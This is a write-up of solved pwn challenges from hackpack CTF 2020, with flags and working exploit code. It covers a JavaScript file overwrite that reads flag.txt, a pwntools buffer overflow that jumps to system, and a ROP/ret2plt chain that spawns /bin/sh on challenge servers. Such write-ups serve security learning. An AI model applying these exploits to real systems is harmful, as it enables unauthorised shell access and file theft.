# hackpack ctf 2020

## pwn

### jsclean

Flag: flag{Js_N3v3R_FuN_2_Re4d}

Workflow:
input a js filename and file content
the server will write the content to the js file
Finally, the server will call index.js which jsclean(beautify) the code you've just written

```lang=c
p = subprocess.run(['/usr/local/bin/node','index.js',
'-f',js_name],stdout=subprocess.PIPE);
```

Solution: overwrite the index.js to read flag.txt

#### payload

```lang=c
input filename: index.js
intput content:  var fs = require('fs'); data = fs.readFileSync("flag.txt"); console.log(data.toString())
```

### mouseTrap

flag: flag{C0nTr0l_S1Z3_4_$h3LL}

Basic BoF, without canary, PIE
Read function with overwritten buffer, call the call_me function to rce

**remark**: Simply jump to function call_me will cause movaps error, which implies stack alignment issue, so jump to the line which calls system_plt instead

#### payload

```lang=c
from pwn import *

r = remote('cha.hackpack.club',41719)
flag = p64(0x40071b)	# system_plt

payload = 'abcdefghijklmnopqrstuvwx' + p64(0x200)
context.arch='amd64'
r.recvuntil("Name: ")
r.send(payload)
r.recvuntil(": ")
bof = "b" * 0x18 + flag
r.send(bof)
r.interactive()

```

### Climb

flag: flag{w0w_A_R34L_LiF3_R0pp3r!}

ROP + ret2plt

call readplt and write binsh to bss section
then set rdi to the string /bin/sh and call system_plt

**Remark**: There is also stack-alignment(movaps error) issue in this challenge, so insert a ret in the ROP for stack alignment

#### payload

```lang=c
from pwn import *

pop_rdi = p64(0x0000000000400743)
pop_rdx = p64(0x0000000000400654)
pop_rsi_r15 = p64(0x0000000000400741)
ret = p64(0x00000000004004fe)

bss = p64(0x601090)
callme = p64(0x0000000000400530)
readplt = p64(0x0000000000400550)

r = remote('cha.hackpack.club', 41702)
ropchain = flat(
	ret,	# movaps stack alignment
	pop_rdi,
	p64(0x0),
	pop_rdx,
	p64(0x8),
	pop_rsi_r15,
	bss,
	p64(0x0),
	readplt,
	pop_rdi,
	bss,
	callme
)

payload = 'a' * 40 + ropchain

r.recvuntil("? ")
r.send(payload + payload)
r.send("/bin/sh\0")
r.interactive()
```

### Humpty Dumpty's SSH Account

**Failed**

Shell, bash command, try to become superuser
